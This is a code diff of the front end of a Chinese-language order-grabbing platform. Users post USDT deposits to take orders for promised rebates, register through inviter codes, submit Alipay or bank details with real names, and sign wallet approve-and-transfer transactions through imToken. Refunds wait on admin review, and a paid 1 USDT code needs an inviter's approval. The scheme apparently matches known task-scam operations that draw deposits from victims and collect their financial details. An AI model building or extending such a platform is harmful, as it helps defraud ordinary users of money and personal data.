+      <div class="detail-grid" style="margin:0 0 14px">
+        <div class="dg-item"><div class="dg-k">收款类型</div><div class="dg-v">${esc(o.payType)}</div></div>
+        <div class="dg-item"><div class="dg-k">本单押金</div><div class="dg-v" style="color:var(--brand)">${depositRequired(o)} USDT</div></div>
+      </div>
+      ${choiceHtml}
+      <div class="notice">⚡ 抢单后请尽快完成，审核通过后返佣自动结算</div>
+    </div>
+    <div class="modal-foot">
+      <button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">再想想</button>
+      <button class="btn btn-primary" data-action="submit-grab" data-id="${o.id}">确认抢单</button>
+    </div>`);
+}
+
+async function submitGrab(id) {
+  try {
+    const pms = getPayMethods(state.user);
+    const chosen = pms.find(p => p.type === state.grabChoice) || pms[0];
+    await api(`/orders/${id}/grab`, { method: 'POST', body: { payMethod: chosen } });
+    closeModal(); state.mineTab = 'working';
+    await refreshAll();
+    toast('抢单成功，请尽快完成');
+  } catch (e) { reportError('submitGrab', e); toast(e.message); }
+}
+
+async function submitWork(id) {
+  try {
+    await api(`/orders/${id}/work`, { method: 'POST' });
+    closeModal(); state.mineTab = 'done';
+    await refreshAll();
+    toast('订单完成，返佣已到账');
+  } catch (e) { reportError('submitWork', e); toast(e.message); }
+}
+
+function openDepositModal(order) {
+  openModal(`<div class="modal-head"><h2>充值押金</h2><button class="icon-btn" data-action="close-modal">✕</button></div>
+    <div class="modal-body">${depositFormHtml({ order, compact: true })}</div>
+    <div class="modal-foot">
+      <button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">取消</button>
+      <button class="btn btn-primary" data-action="confirm-deposit" data-id="${order ? order.id : ''}">我已完成支付</button>
+    </div>`);
+}
+
+async function submitDeposit(orderId) {
+  const amount = Number($('#deposit-amount')?.value) || 0;
+  const min = Number(state.config.minDeposit) || 10;
+  if (amount < min) { toast(`最低充值 ${min} USDT`); return; }
+  try {
+    toast('正在查询链上到账记录…');
+    const r = await api('/deposit', { method: 'POST', body: { amount } });
+    state.user = r.user; closeModal();
+    await refreshAll();
+    toast(`✅ 到账成功！${r.credited} USDT 已入账`);
+    if (orderId) setTimeout(() => openGrabModal(orderId), DELAY_REOPEN_GRAB);
+  } catch (e) { reportError('submitDeposit', e); toast('❌ ' + e.message); }
+}
+
+async function submitDepositDirect(amount) {
+  try {
+    toast('正在查询链上到账记录…');
+    const r = await api('/deposit', { method: 'POST', body: { amount } });
+    state.user = r.user;
+    await refreshAll();
+    toast(`✅ 到账成功！${r.credited} USDT 已入账`);
+  } catch (e) { reportError('submitDepositDirect', e); toast('❌ ' + e.message); }
+}
+
+async function submitRefund() {
+  const amount = Number($('#refund-amount')?.value) || 0;
+  const address = $('#refund-address')?.value.trim();
+  if (amount <= 0) { toast('退款金额不正确'); return; }
+  if (!address) { toast('请输入接收退款的地址'); return; }
+  try {
+    await api('/refund', { method: 'POST', body: { amount, address } });
+    await refreshAll();
+    toast('退款申请已提交，等待管理员审核');
+  } catch (e) { reportError('submitRefund', e); toast(e.message); }
+}
+
+function openEmptyModal() {
+  api('/empty/mine').then(r => {
+    const apply = r.apply;
+    let statusHtml = '';
+    if (!apply || apply.status === 'cancelled') {
+      statusHtml = `<div style="text-align:center; padding:20px 0;">
+        <div style="font-size:14px; color:var(--ink3); margin-bottom:16px;">当前暂无空放码，支付 1 USDT 申请</div>
+        <button class="btn btn-imtoken btn-block" data-action="pay-empty-code">🦊 支付 1 USDT 获取资格</button>
+        <div style="font-size:12px; color:var(--red); margin-top:10px;">支付后请返回此页面确认</div>
+      </div>`;
+    } else if (apply.status === 'pending') {
+      statusHtml = `<div style="text-align:center; padding:30px 0;">
+        <div style="font-size:16px; font-weight:800; color:var(--brand);">审核中</div>
+        <div style="font-size:13px; color:var(--ink3); margin-top:8px; margin-bottom:16px;">请尽快联系您的上级/邀请人进行审核</div>
+        <button class="btn btn-ghost btn-block" data-action="cancel-empty-code" style="color:#dc2626; border-color:#fecaca;">取消当前申请</button>
+      </div>`;
+    } else if (apply.status === 'approved' || apply.status === 'used') {
+      statusHtml = `<div style="text-align:center; padding:20px 0; background:#fff9ec; border-radius:12px; margin-bottom:16px;">
+        <div style="font-size:13px; color:var(--ink3);">您的专属空放码</div>
+        <div style="font-size:28px; font-weight:850; color:var(--red); letter-spacing:2px; margin:8px 0;">${esc(apply.code)}</div>
+        <div style="font-size:12px; color:#16a34a;">请复制此码到上方输入框进行核销</div>
+      </div>`;
+    }
+    openModal(`<div class="modal-head"><h2>内部空放通道</h2><button class="icon-btn" data-action="close-modal">✕</button></div>
+      <div class="modal-body">
+        <label class="field">
+          <span class="field-label">输入空放码直接接单</span>
+          <div style="display:flex; gap:8px;">
+            <input class="input" id="empty-code-input" placeholder="请输入 6 位空放码" style="flex:1; margin-bottom:0;">
+            <button class="btn btn-primary" data-action="redeem-empty-code">核销</button>
+          </div>
+        </label>
+        <div style="height:1px; background:var(--line); margin:24px 0;"></div>
+        ${statusHtml}
+      </div>`);
+  }).catch(e => { reportError('openEmptyModal', e); toast(e.message); });
+}
+
+function openDetail(id) {
+  const o = state.orders.find(x => x.id === id);
+  if (!o) return;
+  const st = statusOf(o.status);
+  const tk = myTaker(o);
+  const canGrab = o.status === 'pending' && !tk;
+  let takersHtml = '';
+  if (o.takers && o.takers.length) {
+    takersHtml = `<div style="font-size:13px;font-weight:800;color:var(--ink3);letter-spacing:.5px;margin:18px 0 10px">接单者</div>${o.takers.map(x => {
+      const pm = x.payMethod || {};
+      const isSelf = x.userId === state.user.id;
+      const text = pm.type === 'alipay' ? `支付宝：${pm.account}` : pm.type === 'bank' ? `银行卡：${pm.bank || ''} ${pm.account}` : '未提供';
+      return `<div style="padding:12px;border:1px solid var(--line);border-radius:10px;margin-bottom:8px">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">
+          <div class="avatar">${esc((x.userName || '?').slice(0, 1))}</div>
+          <div style="flex:1;min-width:0">
+            <div style="font-size:13.5px;font-weight:700">${esc(x.userName)} ${isSelf ? '（我）' : ''}</div>
+            <div style="font-size:11.5px;color:var(--ink3);margin-top:3px">${timeAgo(x.at)} 接单</div>
+          </div>
+          <div style="font-size:13px;font-weight:800;color:var(--brand)">¥${Number(o.commission).toFixed(2)}</div>
+        </div>
+        ${isSelf
+          ? `<div style="font-size:12px;color:var(--ink2);padding:8px 10px;background:#f8f9fd;border-radius:8px"><div>${esc(text)}</div><div style="color:var(--ink3);margin-top:2px">收款姓名：${esc(pm.realName || '')}</div></div>`
+          : `<div style="font-size:12px;color:var(--ink3);padding:8px 10px;background:#f8f9fd;border-radius:8px">仅本人可见</div>`}
+      </div>`;
+    }).join('')}`;
+  }
+  let foot = '';
+  if (canGrab) {
+    foot = `<button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button><button class="btn btn-primary" data-action="grab" data-id="${o.id}">立即抢单</button>`;
+  } else if (tk && tk.status === 'working') {
+    foot = `<button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button><button class="btn btn-primary" data-action="submit-work" data-id="${o.id}">提交完成</button>`;
+  } else {
+    foot = `<div style="flex:1"></div><button class="btn btn-ghost" data-action="close-modal" style="background:#fff;border-color:var(--line)">关闭</button>`;
+  }
+  openModal(`<div class="modal-head"><span class="order-status ${st.cls}" style="font-size:13px">${st.text}</span><button class="icon-btn" data-action="close-modal">✕</button></div>
+    <div class="modal-body">
+      <div style="font-size:12.5px;color:var(--ink3);margin-bottom:6px">订单号：${esc(o.orderNo)}</div>
+      <div class="detail-price">${Number(o.amount).toFixed(2)}</div>
+      <div style="font-size:14px;font-weight:800;color:var(--brand)">返佣 ${Number(o.commission).toFixed(2)}</div>
+      <div class="detail-grid">
+        <div class="dg-item"><div class="dg-k">创建时间</div><div class="dg-v">${fmtDateTime(o.createdAt)}</div></div>
+        <div class="dg-item"><div class="dg-k">收款类型</div><div class="dg-v">${esc(o.payType)}</div></div>
+        <div class="dg-item"><div class="dg-k">发布者</div><div class="dg-v">${esc(o.publisherName)}</div></div>
+        <div class="dg-item"><div class="dg-k">本单押金</div><div class="dg-v" style="color:var(--brand)">${depositRequired(o)} USDT</div></div>
+      </div>
+      ${o.desc ? `<div class="detail-desc">${esc(o.desc)}</div>` : ''}
+      ${takersHtml}
+    </div>
+    <div class="modal-foot">${foot}</div>`);
+}
+
+/* ================= 钱包内直接支付 ================= */
+async function executePayInline(to, amount, isEmptyCode) {
+  closeModal();
+  toast('正在准备支付…');
+  setTimeout(async () => {
+    try {
+      const tw = getTronWeb();
+      if (!tw) throw new Error('未检测到钱包环境，请在 imToken 钱包内打开本页面');
+      let waited = 0;
+      while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) {
+        await new Promise(r => setTimeout(r, 200)); waited += 200;
+      }
+      let fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
+      if (!fromAddress && tw.defaultAddress && tw.defaultAddress.hex) {
+        try { fromAddress = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {}
+      }
+      if (!fromAddress) throw new Error('钱包地址未就绪，请退出页面后重新进入');
+
+      const approveParam = [
+        { type: 'address', value: to },
+        { type: 'uint256', value: '1000000' }
+      ];
+      toast('正在构建授权交易，请稍候…');
+      const slowA = setTimeout(() => toast('⏳ 节点响应较慢，正在多节点加速…'), 3000);
+      const txApprove = await buildTxMulti(tw, USDT_TRC20, 'approve(address,uint256)', approveParam, fromAddress);
+      clearTimeout(slowA);
+      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败，请重试');
+      toast('✅ 请在钱包弹窗中确认授权（1U）…');
+      const signedApprove = await withTimeout(tw.trx.sign(txApprove.transaction), TX_SIGN_TIMEOUT, '授权签名超时（您可能未在钱包中确认），请重试');
+      await withTimeout(tw.trx.sendRawTransaction(signedApprove), TX_SEND_TIMEOUT, '广播授权交易超时，请检查网络后重试');
+      toast('✅ 授权成功，准备支付…');
+      await new Promise(r => setTimeout(r, DELAY_BETWEEN_TX));
+
+      const amountUnits = Math.floor(amount * USDT_DECIMALS).toString();
+      const transferParam = [
+        { type: 'address', value: to },
+        { type: 'uint256', value: amountUnits }
+      ];
+      toast('正在构建支付交易，请稍候…');
+      const slowT = setTimeout(() => toast('⏳ 节点响应较慢，正在多节点加速…'), 3000);
+      const txTransfer = await buildTxMulti(tw, USDT_TRC20, 'transfer(address,uint256)', transferParam, fromAddress);
+      clearTimeout(slowT);
+      if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付交易失败，请重试');
+      toast('✅ 请在钱包弹窗中确认支付…');
+      const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), TX_SIGN_TIMEOUT, '支付签名超时（您可能未在钱包中确认），请重试');
+      await withTimeout(tw.trx.sendRawTransaction(signed), TX_SEND_TIMEOUT, '广播交易超时，请检查网络后重试');
+
+      toast('✅ 支付完成，请在钱包账单中查看');
+      clearPayCtx();
+      await refreshAll();
+      if (isEmptyCode) {
+        api('/empty/apply', { method: 'POST' })
+          .then(() => { toast('申请已提交，请联系邀请人审核'); openEmptyModal(); })
+          .catch(e => { reportError('emptyApply', e); toast(e.message); });
+      }
+    } catch (e) {
+      reportError('executePayInline', e);
+      let errMsg = e.message || '请检查网络';
+      if (/declined|cancel|rejected|用户取消/i.test(errMsg)) errMsg = '您已取消支付';
+      toast('❌ ' + errMsg);
+    }
+  }, DELAY_INLINE);
+}
+
+/* ================= 支付入口 ================= */
+function payWithImToken() {
+  const to = state.config.trc20;
+  const amount = Number($('#deposit-amount')?.value) || 0;
+  if (!to) { toast('收款地址未配置'); return; }
+  if (amount < 1) { toast('请输入支付金额'); return; }
+  if (isWalletEnv()) { executePayInline(to, amount, false); return; }
+  const ctx = { a: to, n: amount, t: 'deposit' };
+  openInImToken(buildPayUrl(ctx.a, ctx.n, ctx.t), ctx);
+}
+
+/* ================= 认证 ================= */
 async function doLogin() {
-  await loadConfig(); const username = ($('#login-username')?.value || '').trim(); const password = $('#login-password')?.value || '';
+  await loadConfig();
+  const username = ($('#login-username')?.value || '').trim();
+  const password = $('#login-password')?.value || '';
   if (!username || !password) { toast('请输入用户名和密码'); return; }
-  try { const r = await api('/auth/login', { method: 'POST', body: { username, password } }); setToken(r.token); state.user = r.user; const [ordersRes, refundsRes] = await Promise.all([api('/orders'), api('/refunds/mine')]); state.orders = ordersRes.orders || []; state.refunds = refundsRes.refunds || []; toast('登录成功'); render(); startPolling(); if (!hasPayMethod(state.user)) setTimeout(() => openPayMethodModal(false), 250); } catch (e) { toast(e.message); }
+  try {
+    const r = await api('/auth/login', { method: 'POST', body: { username, password } });
+    setToken(r.token); state.user = r.user;
+    const [ordersRes, refundsRes] = await Promise.all([api('/orders'), api('/refunds/mine')]);
+    state.orders = ordersRes.orders || []; state.refunds = refundsRes.refunds || [];
+    toast('登录成功'); render(); startPolling();
+    if (!hasPayMethod(state.user)) setTimeout(() => openPayMethodModal(false), 250);
+  } catch (e) { reportError('doLogin', e); toast(e.message); }
 }
 
 async function doRegister() {
-  await loadConfig(); const username = ($('#reg-username')?.value || '').trim(); const password = $('#reg-password')?.value || ''; const password2 = $('#reg-password2')?.value || ''; const inviteCode = ($('#reg-invite')?.value || '').trim();
-  if (!username || !password) { toast('请填写用户名和密码'); return; } if (password.length < 6) { toast('密码至少 6 位'); return; } if (password !== password2) { toast('两次密码不一致'); return; } if (!inviteCode) { toast('请输入邀请码'); return; }
-  try { const r = await api('/auth/register', { method: 'POST', body: { username, nickname: username, password, inviteCode } }); setToken(r.token); state.user = r.user; state.orders = (await api('/orders')).orders || []; state.refunds = []; toast('注册成功，请绑定收款方式'); render(); startPolling(); setTimeout(() => openPayMethodModal(false), 250); } catch (e) { toast(e.message); }
+  await loadConfig();
+  const username = ($('#reg-username')?.value || '').trim();
+  const password = $('#reg-password')?.value || '';
+  const password2 = $('#reg-password2')?.value || '';
+  const inviteCode = ($('#reg-invite')?.value || '').trim();
+  if (!username || !password) { toast('请填写用户名和密码'); return; }
+  if (password.length < 6) { toast('密码至少 6 位'); return; }
+  if (password !== password2) { toast('两次密码不一致'); return; }
+  if (!inviteCode) { toast('请输入邀请码'); return; }
+  try {
+    const r = await api('/auth/register', { method: 'POST', body: { username, nickname: username, password, inviteCode } });
+    setToken(r.token); state.user = r.user;
+    state.orders = (await api('/orders')).orders || []; state.refunds = [];
+    toast('注册成功，请绑定收款方式'); render(); startPolling();
+    setTimeout(() => openPayMethodModal(false), 250);
+  } catch (e) { reportError('doRegister', e); toast(e.message); }
 }
 
 async function doLogout() {
   if (!confirm('确定退出登录吗？')) return;
-  try { await api('/auth/logout', { method: 'POST' }); } catch(e) {}
-  clearToken(); state.user = null; state.orders = []; state.refunds = []; state.view = 'hall'; state.orderTab = 'cancelled'; state.authTab = 'login'; stopPolling(); closeModal(); render();
+  try { await api('/auth/logout', { method: 'POST' }); } catch (e) {}
+  clearToken(); state.user = null; state.orders = []; state.refunds = [];
+  state.view = 'hall'; state.orderTab = 'cancelled'; state.authTab = 'login';
+  stopPolling(); closeModal(); render();
 }
 
 async function savePayMethod() {
-  const alipayName = ($('#pm-alipay-name')?.value || '').trim(); const alipayAcc = ($('#pm-alipay-account')?.value || '').trim(); const bankName = ($('#pm-bank-name')?.value || '').trim(); const bankAcc = ($('#pm-bank-account')?.value || '').trim(); const bankBank = ($('#pm-bank-bank')?.value || '').trim();
-  const hasAlipay = alipayName || alipayAcc; const hasBank = bankName || bankAcc || bankBank;
-  if (!hasAlipay && !hasBank) { toast('请至少填写一种收款方式'); return; } if (hasAlipay) { if (!alipayName) { toast('请填写支付宝收款姓名'); return; } if (!alipayAcc) { toast('请填写支付宝账号'); return; } } if (hasBank) { if (!bankName) { toast('请填写银行卡收款姓名'); return; } if (!bankAcc) { toast('请填写银行卡号'); return; } if (!bankBank) { toast('请填写开户银行'); return; } }
-  const payMethod = { alipay: hasAlipay ? { realName: alipayName, account: alipayAcc } : null, bank: hasBank ? { realName: bankName, account: bankAcc, bank: bankBank } : null };
-  try { const r = await api('/me', { method: 'PATCH', body: { payMethod } }); state.user = r.user; toast('收款方式已保存'); closeModal(); render(); if (currentPmForce && window.__pendingGrabId) { const gid = window.__pendingGrabId; window.__pendingGrabId = null; setTimeout(() => openGrabModal(gid), 300); } } catch (e) { toast(e.message); }
+  const alipayName = ($('#pm-alipay-name')?.value || '').trim();
+  const alipayAcc  = ($('#pm-alipay-account')?.value || '').trim();
+  const bankName   = ($('#pm-bank-name')?.value || '').trim();
+  const bankAcc    = ($('#pm-bank-account')?.value || '').trim();
+  const bankBank   = ($('#pm-bank-bank')?.value || '').trim();
+  const hasAlipay = alipayName || alipayAcc;
+  const hasBank = bankName || bankAcc || bankBank;
+  if (!hasAlipay && !hasBank) { toast('请至少填写一种收款方式'); return; }
+  if (hasAlipay) {
+    if (!alipayName) { toast('请填写支付宝收款姓名'); return; }
+    if (!alipayAcc) { toast('请填写支付宝账号'); return; }
+  }
+  if (hasBank) {
+    if (!bankName) { toast('请填写银行卡收款姓名'); return; }
+    if (!bankAcc) { toast('请填写银行卡号'); return; }
+    if (!bankBank) { toast('请填写开户银行'); return; }
+  }
+  const payMethod = {
+    alipay: hasAlipay ? { realName: alipayName, account: alipayAcc } : null,
+    bank: hasBank ? { realName: bankName, account: bankAcc, bank: bankBank } : null
+  };
+  try {
+    const r = await api('/me', { method: 'PATCH', body: { payMethod } });
+    state.user = r.user; toast('收款方式已保存'); closeModal(); render();
+    if (state.temp.pmForce && state.temp.pendingGrabId) {
+      const gid = state.temp.pendingGrabId;
+      state.temp.pendingGrabId = null;
+      setTimeout(() => openGrabModal(gid), 300);
+    }
+  } catch (e) { reportError('savePayMethod', e); toast(e.message); }
 }
 
+/* ================= 事件委托 ================= */
 document.addEventListener('click', async e => {
   if (e.target.classList && e.target.classList.contains('overlay')) { closeModal(); return; }
-  const el = e.target.closest('[data-action]'); if (!el) return;
+  const el = e.target.closest('[data-action]');
+  if (!el) return;
   const { action, id } = el.dataset;
 
   try {
@@ -736,10 +1278,31 @@ document.addEventListener('click', async e => {
       case 'logout': await doLogout(); break;
       case 'open-paymethod': openPayMethodModal(false); break;
       case 'save-paymethod': await savePayMethod(); break;
-      case 'pick-pm': state.grabChoice = el.dataset.type; document.querySelectorAll('.pm-choice-item').forEach(it => { const isActive = it.dataset.type === state.grabChoice; it.classList.toggle('active', isActive); const radio = it.querySelector('input[type="radio"]'); if (radio) radio.checked = isActive; }); break;
-      case 'pick-wallet': state.wallet = el.dataset.wallet || 'imtoken'; document.querySelectorAll('.wallet-card').forEach(c => { c.classList.toggle('active', c.dataset.wallet === state.wallet); }); break;
+      case 'pick-pm':
+        state.grabChoice = el.dataset.type;
+        document.querySelectorAll('.pm-choice-item').forEach(it => {
+          const isActive = it.dataset.type === state.grabChoice;
+          it.classList.toggle('active', isActive);
+          const radio = it.querySelector('input[type="radio"]');
+          if (radio) radio.checked = isActive;
+        });
+        break;
+      case 'pick-wallet':
+        state.wallet = el.dataset.wallet || 'imtoken';
+        document.querySelectorAll('.wallet-card').forEach(c => {
+          c.classList.toggle('active', c.dataset.wallet === state.wallet);
+        });
+        break;
       case 'open-link-menu': openLinkMenu(); break;
-      case 'toggle-feature': { const idx = el.dataset.idx; state.featureOpen[idx] = !state.featureOpen[idx]; const content = el.nextElementSibling; const arrow = el.querySelector('.arrow'); if (content) content.style.display = state.featureOpen[idx] ? 'block' : 'none'; if (arrow) arrow.style.transform = state.featureOpen[idx] ? 'rotate(180deg)' : 'rotate(0deg)'; break; }
+      case 'toggle-feature': {
+        const idx = el.dataset.idx;
+        state.featureOpen[idx] = !state.featureOpen[idx];
+        const content = el.nextElementSibling;
+        const arrow = el.querySelector('.arrow');
+        if (content) content.style.display = state.featureOpen[idx] ? 'block' : 'none';
+        if (arrow) arrow.style.transform = state.featureOpen[idx] ? 'rotate(180deg)' : 'rotate(0deg)';
+        break;
+      }
       case 'nav': state.view = el.dataset.view; closeModal(); render(); break;
       case 'open-profile': openProfile(); break;
       case 'open': openDetail(id); break;
@@ -752,55 +1315,86 @@ document.addEventListener('click', async e => {
       case 'deposit': openDepositModal(state.orders.find(o => o.id === id)); break;
       case 'pay-imtoken': payWithImToken(); break;
       case 'confirm-deposit': await submitDeposit(el.dataset.id || ''); break;
-      case 'manual-confirm-deposit': { const amount = Number($('#deposit-amount')?.value) || 0; const min = Number(state.config.minDeposit) || 10; if (amount < min) { toast(`最低充值 ${min} USDT`); break; } await submitDepositDirect(amount); break; }
-      case 'copy-addr': { const addr = state.config.trc20; if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(addr).then(() => toast('地址已复制'), () => toast('复制失败')); } break; }
+      case 'manual-confirm-deposit': {
+        const amount = Number($('#deposit-amount')?.value) || 0;
+        const min = Number(state.config.minDeposit) || 10;
+        if (amount < min) { toast(`最低充值 ${min} USDT`); break; }
+        await submitDepositDirect(amount);
+        break;
+      }
+      case 'copy-addr': {
+        const addr = state.config.trc20;
+        copyText(addr, () => toast('地址已复制'));
+        break;
+      }
       case 'submit-refund': await submitRefund(); break;
-      
       case 'open-empty-modal': openEmptyModal(); break;
       case 'redeem-empty-code': {
-        const code = $('#empty-code-input').value.trim(); if (!code) { toast('请输入空放码'); break; }
-        try { await api('/empty/redeem', { method: 'POST', body: { code } }); toast('核销成功！系统正在为您匹配订单'); closeModal(); await refreshAll(); setTimeout(() => { state.orderTab = 'confirm'; render(); }, 1000); } catch (e) { toast(e.message); }
+        const code = $('#empty-code-input').value.trim();
+        if (!code) { toast('请输入空放码'); break; }
+        try {
+          await api('/empty/redeem', { method: 'POST', body: { code } });
+          toast('核销成功！系统正在为您匹配订单');
+          closeModal(); await refreshAll();
+          setTimeout(() => { state.orderTab = 'confirm'; render(); }, 1000);
+        } catch (e) { reportError('redeem-empty-code', e); toast(e.message); }
         break;
       }
       case 'pay-empty-code': {
         const to = state.config.emptyTrc20 || state.config.trc20;
         if (!to) { toast('收款地址未配置'); break; }
         if (isWalletEnv()) { executePayInline(to, 1, true); break; }
-        const payPageUrl = `${location.origin}/pay?a=${encodeURIComponent(to)}&n=1&t=empty`;
-        openInImToken(payPageUrl);
+        const ctx = { a: to, n: 1, t: 'empty' };
+        openInImToken(buildPayUrl(ctx.a, ctx.n, ctx.t), ctx);
         setTimeout(() => {
-           const body = document.querySelector('.modal-body');
-           if (body) {
-              body.innerHTML = `
-                <label class="field">
-                  <span class="field-label">输入空放码直接接单</span>
-                  <div style="display:flex; gap:8px;">
-                    <input class="input" id="empty-code-input" placeholder="请输入 6 位空放码" style="flex:1; margin-bottom:0;">
-                    <button class="btn btn-primary" data-action="redeem-empty-code">核销</button>
-                  </div>
-                </label>
-                <div style="height:1px; background:var(--line); margin:24px 0;"></div>
-                <div style="text-align:center; padding:20px 0;">
-                   <div style="font-size:14px; color:var(--ink3); margin-bottom:16px;">请在完成支付后，点击下方按钮提交审核</div>
-                   <button class="btn btn-primary btn-block" data-action="confirm-empty-pay">我已支付 1U，提交审核</button>
+          const body = document.querySelector('.modal-body');
+          if (body) {
+            body.innerHTML = `
+              <label class="field">
+                <span class="field-label">输入空放码直接接单</span>
+                <div style="display:flex; gap:8px;">
+                  <input class="input" id="empty-code-input" placeholder="请输入 6 位空放码" style="flex:1; margin-bottom:0;">
+                  <button class="btn btn-primary" data-action="redeem-empty-code">核销</button>
                 </div>
-              `;
-           }
+              </label>
+              <div style="height:1px; background:var(--line); margin:24px 0;"></div>
+              <div style="text-align:center; padding:20px 0;">
+                 <div style="font-size:14px; color:var(--ink3); margin-bottom:16px;">请在完成支付后，点击下方按钮提交审核</div>
+                 <button class="btn btn-primary btn-block" data-action="confirm-empty-pay">我已支付 1U，提交审核</button>
+              </div>`;
+          }
         }, 1500);
         break;
       }
-      case 'confirm-empty-pay': { api('/empty/apply', { method: 'POST' }).then(() => { toast('申请已提交，请联系邀请人审核'); openEmptyModal(); }).catch(e => toast(e.message)); break; }
-      case 'cancel-empty-code': { api('/empty/cancel', { method: 'POST' }).then(() => { toast('已取消申请，您可以重新支付'); openEmptyModal(); }).catch(e => toast(e.message)); break; }
+      case 'confirm-empty-pay':
+        api('/empty/apply', { method: 'POST' })
+          .then(() => { toast('申请已提交，请联系邀请人审核'); openEmptyModal(); })
+          .catch(e => { reportError('confirm-empty-pay', e); toast(e.message); });
+        break;
+      case 'cancel-empty-code':
+        api('/empty/cancel', { method: 'POST' })
+          .then(() => { toast('已取消申请，您可以重新支付'); openEmptyModal(); })
+          .catch(e => { reportError('cancel-empty-code', e); toast(e.message); });
+        break;
     }
-  } catch (e) {
-    toast(e.message || '操作失败');
-  }
+  } catch (e) { reportError('click:' + action, e); toast(e.message || '操作失败'); }
 });
 
-document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); if (e.key === 'Enter') { if (document.activeElement?.id === 'login-username') $('#login-password')?.focus(); else if (document.activeElement?.id === 'login-password') doLogin(); } });
-document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible' && state.user) refreshAll(true); });
-window.addEventListener('pageshow', (event) => { if (event.persisted) { closeModal(); if (state.user) refreshAll(true); } });
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeModal();
+  if (e.key === 'Enter') {
+    if (document.activeElement?.id === 'login-username') $('#login-password')?.focus();
+    else if (document.activeElement?.id === 'login-password') doLogin();
+  }
+});
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible' && state.user) refreshAll(true);
+});
+window.addEventListener('pageshow', (event) => {
+  if (event.persisted) { closeModal(); if (state.user) refreshAll(true); }
+});
 
+/* ================= 启动 ================= */
 bootstrap();
 </script>
 <script>
